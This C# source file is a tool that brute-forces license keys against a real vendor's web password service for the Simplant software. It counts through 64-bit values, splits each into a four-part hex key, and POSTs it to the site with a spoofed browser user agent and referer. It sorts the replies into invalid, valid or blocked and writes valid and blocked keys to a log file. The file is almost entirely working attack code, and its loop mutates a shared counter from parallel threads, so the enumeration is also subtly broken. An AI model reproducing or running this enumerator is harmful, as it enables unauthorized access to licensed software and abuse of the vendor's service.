using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace Simplant
{
    internal static class MainClassJoin
    {
        internal static void Start(long _key, long _last)
        {
            var key = _key;
            var last = _last;

            using (var sw = new StreamWriter(DateTime.UtcNow.ToString("yyyy-MM-dd_HH-mm-ss-ffff")+".txt", true))
            {
                Parallel.For(key, last, i =>
                {
                    var resultCheck = Check(key.ToString("x16"));
                    string result;

                    if (resultCheck.Contains("No seat ID found for CCKey") || resultCheck.Contains("Invalid CCKey"))
                        result = "Invalid";
                    else if (resultCheck.Contains("Create new password"))
                    {
                        result = "Valid";
                        sw.WriteLine("{0} == {1}", key.ToString("x16"), result);
                    }
                    else
                    {
                        result = "Block";
                        sw.WriteLine("{0} == {1}", key.ToString("x16"), result);
                    }

                    Console.WriteLine("{0} == {1}", key.ToString("x16"), result);

                    if (!Change(ref key, last)) return;
                });

                sw.Flush();
                sw.Close();
            }
        }

        private static bool Change(ref long key, long last)
        {
            if (key == last) return false;
            key++;
            return true;
        }

        private static string Check(string key)
        {
            var request = GETRequest("https://passwords.simplant.com/WebPasswords/Home/SearchByCCKey", 
                key.Substring(0,4),
                key.Substring(4, 4),
                key.Substring(8, 4),
                key.Substring(12, 4)
            );

            return GetResponseString(request);
        }

        private static HttpWebRequest GETRequest(string uri, string key1, string key2, string key3, string key4)
        {
            var request = (HttpWebRequest)WebRequest.Create(uri);

            request.UserAgent = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.113 Safari/534.30";
            request.Accept = "*/*";
            request.Headers.Add("Accept-Language", "en");
            request.KeepAlive = true;
            request.ContentType = "application/x-www-form-urlencoded";
            request.AllowAutoRedirect = false;
            request.Referer = "https://passwords.simplant.com/WebPasswords/";
            request.Method = "POST";

            var requestString =
                string.Format("CCKeyPart1={0}&CCKeyPart2={1}&CCKeyPart3={2}&CCKeyPart4={3}&searchbutton=Search",
                    key1.ToLower(), key2.ToLower(), key3.ToLower(), key4.ToLower());
            var byteArray = Encoding.Default.GetBytes(requestString);
            request.ContentLength = byteArray.Length;
            request.GetRequestStream().Write(byteArray, 0, byteArray.Length);


            return request;
        }

        private static string GetResponseString(WebRequest request)
        {
            using (var response = (HttpWebResponse)request.GetResponse())
            using (var responseStream = response.GetResponseStream())
            {
                if (responseStream == null) return null;
                using (var reader = new StreamReader(responseStream, Encoding.GetEncoding("Windows-1251")))
                    return reader.ReadToEnd();
            }
        }
    }
}